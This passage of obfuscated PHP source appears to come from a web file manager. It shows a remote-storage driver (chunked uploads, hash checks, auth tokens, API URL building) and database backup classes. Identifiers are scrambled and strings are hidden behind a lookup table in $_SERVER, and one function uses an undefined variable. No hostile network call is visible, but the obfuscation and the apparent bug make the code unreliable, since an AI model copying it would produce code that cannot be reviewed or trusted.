mkdir($ÅÈŒŸÀ§, $•ÏòÛº² = REPEAT_SKIP) { return $this->request($_SERVER[öæÛ¿©¿][1489], array($ÅÈŒŸÀ§, $•ÏòÛº²)); } public function remove($•Ë¦÷ÊÊ) { return $this->request($_SERVER[öæÛ¿©¿][1276], array($•Ë¦÷ÊÊ)); } public function rename($Õ±—Ï¢ú, $†Šªöåğ) { return $this->request($_SERVER[öæÛ¿©¿][1492], array($Õ±—Ï¢ú, $†Šªöåğ)); } public function moveSameAllow() { } public function copy($•ëÂõØ, $×£é„…Ç, $©È“Éîƒ = REPEAT_REPLACE, $¿ÍåûúÌ = false) { return $this->request($_SERVER[öæÛ¿©¿][637], array($•ëÂõØ, $×£é„…Ç, $©È“Éîƒ)); } public function move($íà‘¾êÂ, $êßù®Á¨, $Ó„ªÑ§¬ = REPEAT_REPLACE, $›éó™Ñ = false) { return $this->request($_SERVER[öæÛ¿©¿][639], array($íà‘¾êÂ, $êßù®Á¨, $Ó„ªÑ§¬)); } public function uploadLink($åÛ¯š¤ù, $“š¹¥¬½ = 0) { $ ù®Ë¥ƒ =& $_SERVER[öæÛ¿©¿]; $Ü‹İñ° = IO::init($GLOBALS[$ ù®Ë¥ƒ[7]][$ ù®Ë¥ƒ[87]]); $åş·°ıé = $this->pathApiEncode($Ü‹İñ°->path); $æµüá÷˜ = $this->requestMakeUrl($ ù®Ë¥ƒ[1516], array($ ù®Ë¥ƒ[87] => $åş·°ıé)); return array($ ù®Ë¥ƒ[1517] => $æµüá÷˜); } public function upload($ï¶Ù£ùÑ, $ö£ÙÉıó, $Äâ›ÓËí = false, $¶Ğ·ÖÙä = REPEAT_REPLACE) { $—­™»å¬ =& $_SERVER[öæÛ¿©¿]; if (filesize($ö£ÙÉıó) < $this->uploadChunkSize) { return $this->request($—­™»å¬[108], array($ï¶Ù£ùÑ, $ö£ÙÉıó, $¶Ğ·ÖÙä)); } $Ã¸ƒ¨×… = $this->uploadHashCheck($ï¶Ù£ùÑ, $ö£ÙÉıó, $¶Ğ·ÖÙä); if ($Ã¸ƒ¨×…) { return $Ã¸ƒ¨×…; } $®èãì¬º = @filesize($ö£ÙÉıó); $«“âıï = $this->uploadChunkSize; $›†”—¿¯ = ceil($®èãì¬º / $«“âıï); $ìÓ¨˜–³ = 0; while ($ìÓ¨˜–³ < $›†”—¿¯) { $µ¶£ğå‰ = IO::fileSubstr($ö£ÙÉıó, $ìÓ¨˜–³ * $«“âıï, $«“âıï); $±€üÄ¸œ = $this->tempFile($—­™»å¬[12], $µ¶£ğå‰); $ó¼ˆùıë = array($—­™»å¬[79] => $®èãì¬º, $—­™»å¬[1518] => $«“âıï, $—­™»å¬[1519] => $›†”—¿¯, $—­™»å¬[1520] => $ìÓ¨˜–³); $ñïäÙÑÒ = $this->uploadSend($ï¶Ù£ùÑ, $±€üÄ¸œ, $ó¼ˆùıë, $¶Ğ·ÖÙä); $ìÓ¨˜–³++; if (!$ñïäÙÑÒ) { return !1; } } if (!is_array($ñïäÙÑÒ) || empty($ñïäÙÑÒ[$—­™»å¬[591]])) { return !1; } return $this->pathApiDecode($ñïäÙÑÒ[$—­™»å¬[591]]); } private function uploadHashCheck($† ÚíŸº, $ğşä½Ğç, $åÅ»¤øì) { $Ü§€ñâ =& $_SERVER[öæÛ¿©¿]; $¤Óßğ¶ğ = IO::hashSimple($ğşä½Ğç); $£ı¤Áˆ¶ = array($Ü§€ñâ[1521] => $Ü§€ñâ[1522], $Ü§€ñâ[1480] => $¤Óßğ¶ğ); $¾±÷·ïõ = $this->uploadSend($† ÚíŸº, $Ü§€ñâ[12], $£ı¤Áˆ¶, $åÅ»¤øì); $‘•ïÓ–ö = _get($¾±÷·ïõ, $Ü§€ñâ[591], array()); $Ø½éº¡Ç = _get($‘•ïÓ–ö, $Ü§€ñâ[1523]); if (!is_array($Ø½éº¡Ç) || !$Ø½éº¡Ç[$Ü§€ñâ[559]]) { return !1; } $ƒ“‘§Ø‹ = IO::hashMd5($ğşä½Ğç); if ($Ø½éº¡Ç[$Ü§€ñâ[559]] != $ƒ“‘§Ø‹) { return !1; } if ($¾±÷·ïõ[$Ü§€ñâ[591]][$Ü§€ñâ[1524]]) { $this->uploadChunkSize = $¾±÷·ïõ[$Ü§€ñâ[591]][$Ü§€ñâ[1524]]; } $£ı¤Áˆ¶ = array($Ü§€ñâ[1521] => $Ü§€ñâ[1525], $Ü§€ñâ[1481] => $ƒ“‘§Ø‹, $Ü§€ñâ[1480] => $¤Óßğ¶ğ); $¾±÷·ïõ = $this->uploadSend($† ÚíŸº, $Ü§€ñâ[12], $£ı¤Áˆ¶, $åÅ»¤øì); if (!is_array($¾±÷·ïõ) || empty($¾±÷·ïõ[$Ü§€ñâ[591]])) { return !1; } return $this->pathApiDecode($¾±÷·ïõ[$Ü§€ñâ[591]]); } private function uploadSend($ê„ÙĞÏÑ, $€í°§ó’, $Á›…ñå‡, $¡¡–ô°Õ = '') { $ğ†‚·©¶ =& $_SERVER[öæÛ¿©¿]; $Á›…ñå‡[$ğ†‚·©¶[32]] = get_path_this($ê„ÙĞÏÑ); $Á›…ñå‡[$ğ†‚·©¶[87]] = $this->pathApiEncode(get_path_father($ê„ÙĞÏÑ)); if ($¡¡–ô°Õ) { $Á›…ñå‡[$ğ†‚·©¶[1526]] = $¡¡–ô°Õ; } if ($€í°§ó’) { $Á›…ñå‡[$ğ†‚·©¶[231]] = $ğ†‚·©¶[1341] . $€í°§ó’; } return $this->requestSend($ğ†‚·©¶[1516], $Á›…ñå‡); } protected function pathApiEncode($»ÔºÂ‘­) { $Øç™È‘¯ =& $_SERVER[öæÛ¿©¿]; $¡‡šëé = $this->_config[$Øç™È‘¯[1499]]; $Şå™ƒ¥ú = strlen($¡‡šëé); if (substr($»ÔºÂ‘­, 0, $Şå™ƒ¥ú) == $¡‡šëé) { return $»ÔºÂ‘­; } return $¡‡šëé . ltrim($»ÔºÂ‘­, $Øç™È‘¯[8]); } protected function pathApiDecode($É¡š™ƒÕ) { $Ç†ù³ÌÛ =& $_SERVER[öæÛ¿©¿]; $İ€çßŒÀ = $this->_config[$Ç†ù³ÌÛ[1499]]; $“ºµêƒŒ = strlen($İ€çßŒÀ); if (substr($É¡š™ƒÕ, 0, $“ºµêƒŒ) !== $İ€çßŒÀ) { return $É¡š™ƒÕ; } return $this->_config[$Ç†ù³ÌÛ[1299]] . ltrim(substr($É¡š™ƒÕ, $“ºµêƒŒ), $Ç†ù³ÌÛ[8]); } private function pathInfoParse(&$‚¶Ú¶«) { $÷¸–“­• =& $_SERVER[öæÛ¿©¿]; $©›Éü… = $this->_config; $ÛãÕ´ = $©›Éü…[$÷¸–“­•[572]]; if (!$‚¶Ú¶« || !is_array($‚¶Ú¶«)) { return $‚¶Ú¶«; } static $ç¤Ã“½Å = array(); $ğœÅÎĞ = $ç¤Ã“½Å[$ÛãÕ´[$÷¸–“­•[684]]]; if (!is_array($ğœÅÎĞ)) { $·¡ü”†ƒ = LNG($÷¸–“­•[1527]); $ÊÌİ§Æ† = $©›Éü…[$÷¸–“­•[576]][$÷¸–“­•[90]]; $ÙËœıÃè = parse_url($©›Éü…[$÷¸–“­•[576]][$÷¸–“­•[1528]]); $îôÂÄØĞ = $©›Éü…[$÷¸–“­•[576]][$÷¸–“­•[1529]]; $ğœÅÎĞ = array($÷¸–“­•[1530] => $ÊÌİ§Æ†[$÷¸–“­•[32]] . $÷¸–“­•[1012] . $îôÂÄØĞ . $÷¸–“­•[1341] . $ÙËœıÃè[$÷¸–“­•[207]] . $÷¸–“­•[1014], $÷¸–“­•[1531] => $·¡ü”†ƒ . $÷¸–“­•[1078] . $©›Éü…[$÷¸–“­•[576]][$÷¸–“­•[1528]] . $÷¸–“­•[1532] . LNG($÷¸–“­•[1533]) . $÷¸–“­•[1078] . $îôÂÄØĞ, $÷¸–“­•[1534] => LNG($÷¸–“­•[1535]) . $÷¸–“­•[1536] . $©›Éü…[$÷¸–“­•[576]][$÷¸–“­•[1528]] . $÷¸–“­•[286] . LNG($÷¸–“­•[1537]) . $÷¸–“­•[1536] . $ÊÌİ§Æ†[$÷¸–“­•[598]], $÷¸–“­•[1529] => array($÷¸–“­•[32] => $îôÂÄØĞ, $÷¸–“­•[1538] => $÷¸–“­•[1539]), $÷¸–“­•[1540] => Action($÷¸–“­•[1485])->shareTargetMake($ÛãÕ´[$÷¸–“­•[1496]])); $ç¤Ã“½Å[$ÛãÕ´[$÷¸–“­•[684]]] = $ğœÅÎĞ; } unset($‚¶Ú¶«[$÷¸–“­•[192]]); unset($‚¶Ú¶«[$÷¸–“­•[600]]); unset($‚¶Ú¶«[$÷¸–“­•[189]]); unset($‚¶Ú¶«[$÷¸–“­•[585]]); $‚¶Ú¶«[$÷¸–“­•[1541]] = !0; $‚¶Ú¶«[$÷¸–“­•[233]] = $©›Éü…[$÷¸–“­•[1503]]; $‚¶Ú¶«[$÷¸–“­•[234]] = $©›Éü…[$÷¸–“­•[1504]]; $‚¶Ú¶«[$÷¸–“­•[498]] = $©›Éü…[$÷¸–“­•[1501]]; $‚¶Ú¶«[$÷¸–“­•[1529]] = $ğœÅÎĞ[$÷¸–“­•[1529]]; $‚¶Ú¶«[$÷¸–“­•[1542]] = $ÛãÕ´[$÷¸–“­•[232]]; $‚¶Ú¶«[$÷¸–“­•[1543]] = $ÛãÕ´[$÷¸–“­•[88]]; $‚¶Ú¶«[$÷¸–“­•[1544]] = $ğœÅÎĞ[$÷¸–“­•[1534]]; $‚¶Ú¶«[$÷¸–“­•[1540]] = $ğœÅÎĞ[$÷¸–“­•[1540]]; $ŞŠ½¹ôÀ = explode($÷¸–“­•[8], trim($‚¶Ú¶«[$÷¸–“­•[598]], $÷¸–“­•[8])); $ŞŠ½¹ôÀ[0] = $ğœÅÎĞ[$÷¸–“­•[1530]]; $‚¶Ú¶«[$÷¸–“­•[598]] = implode($÷¸–“­•[8], $ŞŠ½¹ôÀ); if (count($ŞŠ½¹ôÀ) > 1) { unset($‚¶Ú¶«[$÷¸–“­•[1540]]); } if (count($ŞŠ½¹ôÀ) == 1) { if ($‚¶Ú¶«[$÷¸–“­•[33]] == $÷¸–“­•[78]) { $‚¶Ú¶«[$÷¸–“­•[32]] = $ğœÅÎĞ[$÷¸–“­•[1530]]; } array_set_value($‚¶Ú¶«, $÷¸–“­•[1545], $ğœÅÎĞ[$÷¸–“­•[1531]]); } $È ÔóÊ™ = array($÷¸–“­•[1546], $÷¸–“­•[1465], $÷¸–“­•[1547], $÷¸–“­•[1548]); foreach ($È ÔóÊ™ as $ƒòœ±Şˆ) { $á²ì¨÷ = $this->urlAuto(_get($‚¶Ú¶«, $ƒòœ±Şˆ, $÷¸–“­•[12])); if ($á²ì¨÷) { array_set_value($‚¶Ú¶«, $ƒòœ±Şˆ, $á²ì¨÷); } } } private function _info($·ûëéÄ£, $ˆóÎ§š” = false) { $¤”™»µ =& $_SERVER[öæÛ¿©¿]; $š›œ‹ùŠ = $this->_config; if (!$š›œ‹ùŠ) { return !1; } static $†ÌÕÊÆ“ = array(); if (isset($†ÌÕÊÆ“[$·ûëéÄ£]) && is_array($†ÌÕÊÆ“[$·ûëéÄ£])) { return $†ÌÕÊÆ“[$·ûëéÄ£]; } if ((!$·ûëéÄ£ || !trim($·ûëéÄ£, $¤”™»µ[8])) && !$ˆóÎ§š”) { $½› ƒØ„ = $š›œ‹ùŠ[$¤”™»µ[576]][$¤”™»µ[90]]; if (!$½› ƒØ„) { return !1; } $½› ƒØ„[$¤”™»µ[598]] = $¤”™»µ[12]; $½› ƒØ„[$¤”™»µ[87]] = $š›œ‹ùŠ[$¤”™»µ[1299]]; $this->pathInfoParse($½› ƒØ„); return $½› ƒØ„; } $š”şÌÈ³ = $this->request($¤”™»µ[1549], array($·ûëéÄ£, $ˆóÎ§š”)); $†ÌÕÊÆ“[$·ûëéÄ£] = $š”şÌÈ³; return $š”şÌÈ³; } private function _fileSubstr($Å‹ğÌå–, $ Û¾Ë£ù = 0, $åóßÎ™¼ = -1) { $®ôÔ§Üš =& $_SERVER[öæÛ¿©¿]; $ú·‘±É… = $this->_fileLink($Å‹ğÌå–); if (!$ú·‘±É…) { return !1; } $ĞÇèö´  = !1; if ($åóßÎ™¼ > 0) { $òé¾ÏÎí = $Ó·ˆëÌ + $åóßÎ™¼ - 1; $ĞÇèö´  = array($®ôÔ§Üš[1550] . $Ó·ˆëÌ . $®ôÔ§Üš[473] . $òé¾ÏÎí); } $¤çÔœª¹ = url_request($ú·‘±É…, $®ôÔ§Üš[1551], !1, $ĞÇèö´ ); return $¤çÔœª¹[$®ôÔ§Üš[842]] ? $¤çÔœª¹[$®ôÔ§Üš[1335]] : !1; } private function _download($³øÊô¹ú, $’™®¦ò) { $¥ª¶ş‘Ã = $this->_fileLink($³øÊô¹ú); if (!$¥ª¶ş‘Ã) { return !1; } Downloader::start($¥ª¶ş‘Ã, $’™®¦ò); return $’™®¦ò; } private function _fileLink($–ãÜÊ¯Ê, $½óÂ‘Ë™ = '') { $í»òÈ“ =& $_SERVER[öæÛ¿©¿]; $¡§ş®È = $this->pathApiEncode($–ãÜÊ¯Ê); return $this->requestMakeUrl($í»òÈ“[1552], array($í»òÈ“[87] => $¡§ş®È)) . $½óÂ‘Ë™; } private function urlAuto($ìĞá¢™½) { $¦Éıù–À =& $_SERVER[öæÛ¿©¿]; if (!$ìĞá¢™½) { return $ìĞá¢™½; } $ïÄ°½‘ = parse_url($ìĞá¢™½); $ëÆà‚àÓ = $ìĞá¢™½; if ($this->_config[$¦Éıù–À[1502]] && $ïÄ°½‘[$¦Éıù–À[206]] == $¦Éıù–À[150] && Input::check($ïÄ°½‘[$¦Éıù–À[1553]], $¦Éıù–À[1554])) { $ìĞá¢™½ = $¦Éıù–À[218] . substr($ìĞá¢™½, 7); } $¯©¡´ü‘ = $¦Éıù–À[1555] . rawurlencode(rtrim($this->config[$¦Éıù–À[1499]], $¦Éıù–À[8])); if (strstr($ìĞá¢™½, $¯©¡´ü‘)) { $ç¿±‰ÂÈ = strstr($ìĞá¢™½, $¦Éıù–À[76]) ? $¦Éıù–À[285] : $¦Éıù–À[76]; $ìĞá¢™½ = $ìĞá¢™½ . $ç¿±‰ÂÈ . $¦Éıù–À[1556] . $this->authToken; } return $ìĞá¢™½; } private function request($­Ë…öÂ, $Í¯åºá) { $­Ìøü¸” =& $_SERVER[öæÛ¿©¿]; if (!is_array($Í¯åºá)) { $Í¯åºá = array(); } for ($ë»ê‚¾ = 0; $ë»ê‚¾ < 4; $ë»ê‚¾++) { if (!isset($Í¯åºá[$ë»ê‚¾])) { $Í¯åºá[$ë»ê‚¾] = $­Ìøü¸”[12]; } } $ÊïµÔö = array($­Ìøü¸”[1549] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1549], $­Ìøü¸”[1558] => $­Ìøü¸”[1559], $­Ìøü¸”[1560] => $­Ìøü¸”[87], $­Ìøü¸”[1298] => array($­Ìøü¸”[1561] => array(array($­Ìøü¸”[87] => $Í¯åºá[0])), $­Ìøü¸”[1562] => $Í¯åºá[1] ? $­Ìøü¸”[91] : $­Ìøü¸”[12])), $­Ìøü¸”[1511] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1563], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1560] => $­Ìøü¸”[1564], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => $Í¯åºá[0])), $­Ìøü¸”[1565] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1566], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1560] => $­Ìøü¸”[1567], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => $Í¯åºá[0])), $­Ìøü¸”[1512] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1568], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1569] => $­Ìøü¸”[1570], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => $Í¯åºá[0], $­Ìøü¸”[169] => $Í¯åºá[1])), $­Ìøü¸”[1488] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1488], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1569] => $­Ìøü¸”[591], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => $Í¯åºá[0], $­Ìøü¸”[169] => $Í¯åºá[1], $­Ìøü¸”[1526] => $Í¯åºá[2])), $­Ìøü¸”[1489] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1489], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1569] => $­Ìøü¸”[591], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => $Í¯åºá[0], $­Ìøü¸”[1526] => $Í¯åºá[2])), $­Ìøü¸”[637] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1571], $­Ìøü¸”[1558] => $­Ìøü¸”[1572], $­Ìøü¸”[1569] => $­Ìøü¸”[1573], $­Ìøü¸”[1298] => array($­Ìøü¸”[1561] => array(array($­Ìøü¸”[87] => $Í¯åºá[0])), $­Ìøü¸”[87] => $Í¯åºá[1], $­Ìøü¸”[1526] => $Í¯åºá[2])), $­Ìøü¸”[639] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1574], $­Ìøü¸”[1558] => $­Ìøü¸”[1572], $­Ìøü¸”[1569] => $­Ìøü¸”[1573], $­Ìøü¸”[1298] => array($­Ìøü¸”[1561] => array(array($­Ìøü¸”[87] => $Í¯åºá[0])), $­Ìøü¸”[87] => $Í¯åºá[1], $­Ìøü¸”[1526] => $Í¯åºá[2])), $­Ìøü¸”[1276] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1575], $­Ìøü¸”[1558] => $­Ìøü¸”[1559], $­Ìøü¸”[1560] => $­Ìøü¸”[87], $­Ìøü¸”[1298] => array($­Ìøü¸”[1561] => array(array($­Ìøü¸”[87] => $Í¯åºá[0])))), $­Ìøü¸”[1492] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1576], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1569] => $­Ìøü¸”[591], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => $Í¯åºá[0], $­Ìøü¸”[1577] => $Í¯åºá[1])), $­Ìøü¸”[108] => array($­Ìøü¸”[1557] => $­Ìøü¸”[1516], $­Ìøü¸”[1558] => $­Ìøü¸”[87], $­Ìøü¸”[1569] => $­Ìøü¸”[591], $­Ìøü¸”[1298] => array($­Ìøü¸”[87] => get_path_father($Í¯åºá[0]), $­Ìøü¸”[231] => $Í¯åºá[1] ? $­Ìøü¸”[1341] . $Í¯åºá[1] : $­Ìøü¸”[12], $­Ìøü¸”[32] => get_path_this($Í¯åºá[0]), $­Ìøü¸”[1526] => $Í¯åºá[2]))); $•½€ö½Š = $ÊïµÔö[$­Ë…öÂ]; if (!$•½€ö½Š) { return !1; } $ÙÔè¾Â¬ = $•½€ö½Š[$­Ìøü¸”[1298]]; $€ãùéõˆ = explode($­Ìøü¸”[50], $•½€ö½Š[$­Ìøü¸”[1558]]); foreach ($€ãùéõˆ as $†Å·ô×…) { $¡îŒàäƒ = $this->pathApiEncode(_get($ÙÔè¾Â¬, $†Å·ô×…)); array_set_value($ÙÔè¾Â¬, $†Å·ô×…, $¡îŒàäƒ); } if ($­Ë…öÂ == $­Ìøü¸”[1492] && trim($•½€ö½Š[$­Ìøü¸”[1298]][$­Ìøü¸”[87]], $­Ìøü¸”[8]) == trim($this->_config[$­Ìøü¸”[1299]], $­Ìøü¸”[8])) { return $•½€ö½Š[$­Ìøü¸”[1298]][$­Ìøü¸”[87]]; } $É–®£æ = $this->requestSend($•½€ö½Š[$­Ìøü¸”[1557]], $ÙÔè¾Â¬); if (!$É–®£æ) { return !1; } $šÄâÛÊ = $É–®£æ[$­Ìøü¸”[1335]]; if ($•½€ö½Š[$­Ìøü¸”[1569]]) { $šÄâÛÊ = _get($É–®£æ, $•½€ö½Š[$­Ìøü¸”[1569]]); } if (is_string($šÄâÛÊ) && !$•½€ö½Š[$­Ìøü¸”[1560]]) { return $this->pathApiDecode($šÄâÛÊ); } if (!is_array($šÄâÛÊ) || !$šÄâÛÊ) { return $šÄâÛÊ; } $ÜÉƒÀê = explode($­Ìøü¸”[50], $•½€ö½Š[$­Ìøü¸”[1560]]); foreach ($ÜÉƒÀê as $†Å·ô×…) { $¸Ûı±É = explode($­Ìøü¸”[10], $†Å·ô×…); $„¯î­úĞ = array_search($­Ìøü¸”[1578], $¸Ûı±É); if ($„¯î­úĞ === !1) { $¡îŒàäƒ = $this->pathApiDecode(_get($šÄâÛÊ, $†Å·ô×…)); array_set_value($šÄâÛÊ, $†Å·ô×…, $¡îŒàäƒ); if ($­Ë…öÂ == $­Ìøü¸”[1549] && $†Å·ô×… == $­Ìøü¸”[87]) { $this->pathInfoParse($šÄâÛÊ); } if ($­Ë…öÂ == $­Ìøü¸”[1511] && $†Å·ô×… == $­Ìøü¸”[1579]) { $this->pathInfoParse($šÄâÛÊ[$­Ìøü¸”[1486]]); } if ($­Ë…öÂ == $­Ìøü¸”[1511]) { $šÄâÛÊ[$­Ìøü¸”[1580]] = array(); } continue; } $¼²Ã£°¶ = implode($­Ìøü¸”[10], array_slice($¸Ûı±É, $„¯î­úĞ + 1)); $Ø•¸Šƒ = array(); if ($„¯î­úĞ === 0) { $Ø•¸Šƒ =& $šÄâÛÊ; } if ($„¯î­úĞ === 1) { $Ø•¸Šƒ =& $šÄâÛÊ[$¸Ûı±É[0]]; } if ($„¯î­úĞ === 2) { $Ø•¸Šƒ =& $šÄâÛÊ[$¸Ûı±É[0]][$¸Ûı±É[1]]; } foreach ($Ø•¸Šƒ as $†Å·ô×… => $½çöªß) { $¡îŒàäƒ = $this->pathApiDecode(_get($½çöªß, $¼²Ã£°¶)); array_set_value($Ø•¸Šƒ[$†Å·ô×…], $¼²Ã£°¶, $¡îŒàäƒ); $this->pathInfoParse($Ø•¸Šƒ[$†Å·ô×…]); } unset($Ø•¸Šƒ); } return $šÄâÛÊ; } private function requestMakeUrl($¤Ê½­Šê, $‡‹¾«¬¡ = '') { $™Õ§õß =& $_SERVER[öæÛ¿©¿]; $öÚçñı = $this->_config; if (!$this->authToken) { return !1; } $ğ÷¥¯­º = $this->requestQuery($‡‹¾«¬¡, !0) . $™Õ§õß[1581] . $this->authToken; $û·˜‘Şú = rtrim($öÚçñı[$™Õ§õß[576]][$™Õ§õß[1528]], $™Õ§õß[8]) . $™Õ§õß[1582] . $¤Ê½­Šê; return $û·˜‘Şú . $™Õ§õß[1583] . rawurlencode($öÚçñı[$™Õ§õß[576]][$™Õ§õß[1500]]) . $ğ÷¥¯­º; } private function requestAuthToken() { $µ­È«å =& $_SERVER[öæÛ¿©¿]; $Ó„ˆÉ¿Ú = $this->_config; if (!$Ó„ˆÉ¿Ú) { return !1; } $ÌˆÇ¶óÊ = _get($Ó„ˆÉ¿Ú, $µ­È«å[1584]); $êê©¶Ã = array_find_by_field($Ó„ˆÉ¿Ú[$µ­È«å[576]][$µ­È«å[1540]], $µ­È«å[1585], $ÌˆÇ¶óÊ); if (!$êê©¶Ã) { return !1; } $’ƒÆ´éÊ = $êê©¶Ã[$µ­È«å[1586]] . $µ­È«å[1587] . $êê©¶Ã[$µ­È«å[1289]]; $“€ô°ñ = $µ­È«å[1588] . $this->pathParse[$µ­È«å[483]] . $µ­È«å[473] . $’ƒÆ´éÊ; $“‰©öÄ = Cache::get($“€ô°ñ); if ($“‰©öÄ) { return $“‰©öÄ; } $“‰©öÄ = Mcrypt::encode($’ƒÆ´éÊ, $µ­È«å[1589]); Cache::set($“€ô°ñ, $“‰©öÄ, 3600 * 24 * 60); return $“‰©öÄ; } private function requestQuery($ö°ş™øı = '', $©¿ˆ»š´ = false) { if (!$ö°ş™øı || !is_array($ö°ş™øı)) { return $ö°ş™øı; } foreach ($ö°ş™øı as $ª¶ºĞªÔ => $“üÊÍçò) { if (is_array($“üÊÍçò)) { $ö°ş™øı[$ª¶ºĞªÔ] = json_encode($“üÊÍçò); } } return $©¿ˆ»š´ ? $_SERVER[öæÛ¿©¿][285] . http_build_query($ö°ş™øı) : $ö°ş™øı; } private function requestSend($çˆÈïãÎ, $ùÀÑÎëœ) { $¼ÃïõÔ« =& $_SERVER[öæÛ¿©¿]; $ãÈ”ÒğÀ = $this->requestMakeUrl($çˆÈïãÎ); if (!$ãÈ”ÒğÀ) { return !1; } $Åâ®ˆÃ… = url_request($ãÈ”ÒğÀ, $¼ÃïõÔ«[289], $this->requestQuery($ùÀÑÎëœ), !1, !1, !0); $åÒÁò = $Åâ®ˆÃ…[$¼ÃïõÔ«[1335]]; if (!is_array($åÒÁò) || !$åÒÁò || !$åÒÁò[$¼ÃïõÔ«[1345]] || intval($åÒÁò[$¼ÃïõÔ«[1345]]) > 500) { $¯³à¿°Ã = is_array($åÒÁò) ? $åÒÁò[$¼ÃïõÔ«[1335]] : $åÒÁò . $¼ÃïõÔ«[12]; if (!$Åâ®ˆÃ…[$¼ÃïõÔ«[842]]) { $¯³à¿°Ã .= $¼ÃïõÔ«[1590] . $Åâ®ˆÃ…[$¼ÃïõÔ«[1345]] . $¼ÃïõÔ«[176]; } IO::errorTips($¯³à¿°Ã, !1); return !1; } return $åÒÁò; } } goto C¹—ƒ…×Â³; bˆÓî²ã¼Š: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $şïİ¨„† =& $_SERVER[öæÛ¿©¿]; $”åíç± = Backup::get(); self::$io = $”åíç±[$şïİ¨„†[844]]; self::$name = $”åíç±[$şïİ¨„†[32]]; $ŞŠ½Ë¹¾ = new DbManage(); $«ã®æ®Ã = $ŞŠ½Ë¹¾->dbType(); $ş¹¸´— = array($şïİ¨„†[873] => $«ã®æ®Ã, $şïİ¨„†[874] => time()); Backup::set($ş¹¸´—); $§¶ïìû¸ = $this->tmpFilesPath() . $şïİ¨„†[875] . self::$name . $şïİ¨„†[8]; del_dir($§¶ïìû¸); mk_dir($§¶ïìû¸); $ µÉ‡Î = $¦Í™—ï = 0; try { $Ü—µ´ŠŸ = $ŞŠ½Ë¹¾->db()->getTables(); } catch (Exception $ÌÀÖ”ÛÒ) { Backup::log($şïİ¨„†[876] . $ÌÀÖ”ÛÒ->getMessage()); return !1; } $Ü—µ´ŠŸ = array_diff($Ü—µ´ŠŸ, array($şïİ¨„†[877], $şïİ¨„†[878])); foreach ($Ü—µ´ŠŸ as $‡…¡îûé) { if ($‡…¡îûé == $şïİ¨„†[879]) { continue; } $ µÉ‡Î += $ŞŠ½Ë¹¾->model($‡…¡îûé)->count(); } $ı±Àæ§İ = new Task($şïİ¨„†[880], $şïİ¨„†[872], $ µÉ‡Î, LNG($şïİ¨„†[881]) . $şïİ¨„†[882] . LNG($şïİ¨„†[883])); $GLOBALS[$şïİ¨„†[884]] = self::$name; foreach ($Ü—µ´ŠŸ as $‡…¡îûé) { $€ñ¢üÇ = $§¶ïìû¸ . $‡…¡îûé . $şïİ¨„†[885]; if ($‡…¡îûé == $şïİ¨„†[879]) { @touch($€ñ¢üÇ); continue; } $ÔíŒ÷•Æ = null; if ($‡…¡îûé == $şïİ¨„†[886] && $”åíç±[$şïİ¨„†[169]] == $şïİ¨„†[871]) { $ÔíŒ÷•Æ = self::$io; } $¦Í™—ï += $ŞŠ½Ë¹¾->sqlFromDb($‡…¡îûé, $€ñ¢üÇ, $ı±Àæ§İ, $ÔíŒ÷•Æ); } unset($GLOBALS[$şïİ¨„†[884]]); $ı±Àæ§İ->end(); if ($¦Í™—ï > $ µÉ‡Î) { $ µÉ‡Î = $¦Í™—ï; } $ş¹¸´— = array($şïİ¨„†[873] => $«ã®æ®Ã, $şïİ¨„†[868] => 1, $şïİ¨„†[887] => $ µÉ‡Î, $şïİ¨„†[888] => $¦Í™—ï, $şïİ¨„†[889] => time()); Backup::set($ş¹¸´—); if ($ µÉ‡Î - $¦Í™—ï > 0) { $Š™ÊÊ†å = $şïİ¨„†[890]; if (!stristr(I18n::getType(), $şïİ¨„†[891])) { $Š™ÊÊ†å = $şïİ¨„†[892]; } Backup::log(array($Š™ÊÊ†å, $ş¹¸´—)); return !1; } return !0; } private function tmpFilesPath() { $¿Ûİ¥† =& $_SERVER[öæÛ¿©¿]; $”Š„áäå = TEMP_FILES; if ($GLOBALS[$¿Ûİ¥†[6]][$¿Ûİ¥†[92]][$¿Ûİ¥†[893]]) { $”Š„áäå = $GLOBALS[$¿Ûİ¥†[6]][$¿Ûİ¥†[92]][$¿Ûİ¥†[893]]; if (!mk_dir($”Š„áäå) || !is_writable($”Š„áäå) || !IO::mkfile($”Š„áäå . $¿Ûİ¥†[894])) { $”Š„áäå = TEMP_FILES; } } return $”Š„áäå; } } class BackupDbFile { public function __construct() { } public function index() { $ï¡Âßé’ =& $_SERVER[öæÛ¿©¿]; $Æï¤÷ = Backup::get(); $ˆÁÃ—¥î = $Æï¤÷[$ï¡Âßé’[32]]; $ùüŸì˜  = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\160\x5f{$ˆÁÃ—¥î}\57"; $éâÌŒ´¢ = $this->backupPath($Æï¤÷); if (!($éâÌŒ´¢ = IO::mkdir($éâÌŒ´¢))) { Backup::log($ï¡Âßé’[895] . $éâÌŒ´¢); return !1; } $ÌÛè‡ù¨ = new DbManage(); $Ø¬‡Şº£ = $ÌÛè‡ù¨->getSqlFile(); if (!$Ø¬‡Şº£ || !$Ø¬‡Şº£[$ï¡Âßé’[896]] || !$Ø¬‡Şº£[$ï¡Âßé’[13]]) { Backup::log($ï¡Âßé’[897]); return !1; } IO::move($Ø¬‡Şº£[$ï¡Âßé’[896]], $ùüŸì˜ ); 